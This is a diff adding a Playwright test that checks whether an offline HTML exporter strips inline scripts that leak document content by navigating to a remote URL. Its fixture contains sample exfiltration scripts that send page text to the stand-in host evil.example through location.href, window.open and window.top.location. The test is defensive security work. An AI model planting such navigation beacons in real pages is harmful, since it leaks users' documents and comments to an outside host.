@@ -576,6 +576,182 @@ test("Export Offline neutralizes form posts and preserves safe canvas scripts (C
   }
 });
 
+test("a preserved inline script cannot beacon by navigating the offline file to a remote URL (CMH-OFFLINE-05)", async ({ page, browser }) => {
+  // The zero-network CSP blocks every SUBRESOURCE channel but cannot restrict TOP-LEVEL
+  // NAVIGATION: `navigate-to` was dropped from CSP Level 3 and ships in no browser, and
+  // `sandbox` is ignored when the policy arrives in a <meta>. So a script the export
+  // deliberately preserves (CMH-OFFLINE-04) could exfiltrate the whole document - every
+  // reviewer comment included - simply by assigning `location.href`. The exporter therefore
+  // strips a direct scripted navigation to a network URL the same way it strips a remote
+  // dynamic import. The beacon is armed only under `file:` so the SOURCE document, which the
+  // exporter reads over http, is not the thing that navigates away.
+  const CONTENT_WITH_NAVIGATION = `
+<h1>Offline navigation egress</h1>
+<p id="nav-note">A preserved inline script must not be able to beacon by navigating away.</p>
+<meta name="referrer" content="unsafe-url">
+<meta http-equiv="Referrer-Policy" content="unsafe-url">
+<a id="docsLink" href="https://docs.example.org/guide" referrerpolicy="unsafe-url">Docs</a>
+<script>
+(function () {
+  window.__cmhExfilRan = true;
+  if (location.protocol === "file:") {
+    location.href = "https://evil.example/steal?data=" + encodeURIComponent(document.body.innerText);
+  }
+})();
+</script>
+<script>
+(function () {
+  window.__cmhOpenExfilRan = true;
+  if (location.protocol === "file:") window.open("https://evil.example/popup");
+})();
+</script>
+<script>
+(function () {
+  // A prefix CHAIN used to clear the strip - typing "window." in front of the sink is not a
+  // meaningful obstacle, so the pattern must follow the whole chain.
+  window.__cmhChainExfilRan = true;
+  if (location.protocol === "file:") window.top.location.href = "https://evil.example/chain";
+})();
+</script>
+<script>
+(function () {
+  // Control: mentions both a navigation object and a network URL literal, but never
+  // navigates to one. A strip that deleted this would break benign authored documents.
+  window.__cmhBenignLocationKept = true;
+  var DOCS_URL = "https://docs.example.org/guide";
+  if (location.hash === "#docs" && location.href !== DOCS_URL) document.title = "docs";
+})();
+</script>
+<script>
+(function () {
+  // Control: a LOCAL binding that merely happens to be named "location", and a local helper
+  // named "open". Neither navigates anything, and deleting the whole script over them would
+  // silently break an ordinary authored document - the costlier failure direction.
+  var location = "https://api.example.org/v1";
+  var open = function (u) { window.__cmhLocalOpenArg = u; };
+  open("https://docs.example.org/guide");
+  window.__cmhLocalShadowKept = location;
+})();
+</script>
+<script>
+(function () {
+  // Control: a shadowed location OBJECT whose href is then assigned. This is the shape the
+  // sink pattern matches literally, yet it navigates nothing - only the local object changes.
+  var location = { href: "" };
+  location.href = "https://api.example.org/v1";
+  window.__cmhShadowedHrefKept = location.href;
+})();
+</script>`;
+  const staged = stageContent(CONTENT_WITH_NAVIGATION, { key: "cmh-offline-navigation", source: "offline-navigation.html" });
+  const server = await startStaticServer(staged.dir);
+  const outDir = makeTmpDir();
+  let ctx2;
+  try {
+    await page.route(/^https?:\/\//, async (route) => {
+      const url = route.request().url();
+      if (/^https?:\/\/(localhost|127\.0\.0\.1)(:|\/)/.test(url)) return route.fallback();
+      return route.abort();
+    });
+    await installDownloadTextCapture(page);
+    await page.goto(server.url + "/test-doc.html");
+    await ready(page);
+    await openToolbarMenu(page);
+
+    const [download] = await Promise.all([
+      page.waitForEvent("download"),
+      page.locator("#btnExportOfflineTop").click(),
+    ]);
+    expect(download.suggestedFilename()).toMatch(/-offline\.html$/);
+    const exportedHtml = await capturedDownloadText(page);
+    expect(exportedHtml).not.toContain("evil.example");
+    expect(exportedHtml).toContain("window.__cmhBenignLocationKept = true");
+    // The costlier failure direction: a benign script that merely SHADOWS `location` / `open`
+    // with local bindings must survive intact, or an ordinary authored document is silently
+    // broken by the export.
+    expect(exportedHtml).toContain("window.__cmhLocalShadowKept = location");
+    expect(exportedHtml).toContain("window.__cmhShadowedHrefKept = location.href");
+    // Removing a script is content loss, so the user is told rather than left to guess - and the
+    // COUNT must be right, or a miscount regression would read as a pass.
+    await expect(page.locator("#toast")).toContainText("3 scripts that load or navigate to the network were removed.");
+    // A navigation that does still happen (a user-clicked link, or a script that builds the
+    // URL dynamically) must at least not leak where it came from. The fixture authors a
+    // PERMISSIVE `unsafe-url` policy both as a document meta and on the anchor itself, so this
+    // fails unless the export really replaces the meta and strips the attribute.
+    const referrerMetas = exportedHtml.match(/<meta\b[^>]*\bname=["']referrer["'][^>]*>/gi) || [];
+    expect(referrerMetas).toHaveLength(1);
+    expect(referrerMetas[0]).toMatch(/content=["']no-referrer["']/i);
+    expect(exportedHtml).not.toMatch(/content=["']unsafe-url["']/i);
+    expect(exportedHtml).not.toMatch(/http-equiv=["']Referrer-Policy["']/i);
+    expect(exportedHtml).not.toMatch(/\sreferrerpolicy\s*=/i);
+
+    const exportedPath = path.join(outDir, "offline-navigation.html");
+    fs.writeFileSync(exportedPath, exportedHtml);
+    execFileSync(PYTHON, ["tools/validate/validate.py", "--strict", exportedPath], { cwd: SKILL, stdio: "pipe" });
+
+    // The strict validator must not bless a hand-authored offline file that keeps the same
+    // shape: the strip and the gate have to agree, or the gate certifies a file the exporter
+    // no longer protects.
+    const smuggledPath = path.join(outDir, "offline-navigation-smuggled.html");
+    fs.writeFileSync(smuggledPath, exportedHtml.replace(
+      "</body>",
+      '<script>location.href = "https://evil.example/steal";</script></body>'));
+    let smuggledOut = "";
+    try {
+      execFileSync(PYTHON, ["tools/validate/validate.py", "--strict", smuggledPath], { cwd: SKILL, stdio: "pipe" });
+      throw new Error("the strict validator accepted a smuggled top-level navigation");
+    } catch (e) {
+      smuggledOut = String(e.stdout || "") + String(e.stderr || "") + String(e.message || "");
+    }
+    // Match the specific navigation error, not just any validation failure - otherwise an
+    // unrelated breakage would read as this gate working.
+    expect(smuggledOut).toMatch(/matches a direct top-level navigation to a network URL/i);
+
+    ctx2 = await browser.newContext();
+    const page2 = await ctx2.newPage();
+    const external = [];
+    await page2.route(/^https?:\/\//, async (route) => {
+      external.push(route.request().url());
+      await route.abort();
+    });
+    await page2.goto(fileUrl(exportedPath));
+    await ready(page2);
+    const state = await page2.evaluate(() => {
+      const link = document.getElementById("docsLink");
+      return {
+        exfilRan: window.__cmhExfilRan === true,
+        openExfilRan: window.__cmhOpenExfilRan === true,
+        chainExfilRan: window.__cmhChainExfilRan === true,
+        benignKept: window.__cmhBenignLocationKept === true,
+        localShadowKept: window.__cmhLocalShadowKept,
+        localOpenArg: window.__cmhLocalOpenArg,
+        shadowedHrefKept: window.__cmhShadowedHrefKept,
+        // The anchor itself must survive with its href intact - only the permissive
+        // referrerpolicy is taken away, so the export is not just deleting the link.
+        linkHref: link && link.getAttribute("href"),
+        linkPolicy: link && link.getAttribute("referrerpolicy"),
+        docPolicy: (document.querySelector('meta[name="referrer"]') || {}).content,
+      };
+    });
+    expect(state.exfilRan).toBe(false);
+    expect(state.openExfilRan).toBe(false);
+    expect(state.chainExfilRan).toBe(false);
+    expect(state.benignKept).toBe(true);
+    expect(state.localShadowKept).toBe("https://api.example.org/v1");
+    expect(state.localOpenArg).toBe("https://docs.example.org/guide");
+    expect(state.shadowedHrefKept).toBe("https://api.example.org/v1");
+    expect(state.linkHref).toBe("https://docs.example.org/guide");
+    expect(state.linkPolicy).toBeNull();
+    expect(state.docPolicy).toBe("no-referrer");
+    expect(page2.url()).toBe(fileUrl(exportedPath));
+    expect(external).toEqual([]);
+  } finally {
+    if (ctx2) await ctx2.close();
+    await server.close();
+    fs.rmSync(staged.dir, { recursive: true, force: true });
+    fs.rmSync(outDir, { recursive: true, force: true });
+  }
+});
+
 test("NonPortable export ignores region marker text in content (CMH-FWDCOMPAT-01)", async ({ page }) => {
   const staged = stageNonPortable({
     mutate: (html) => html.replace(
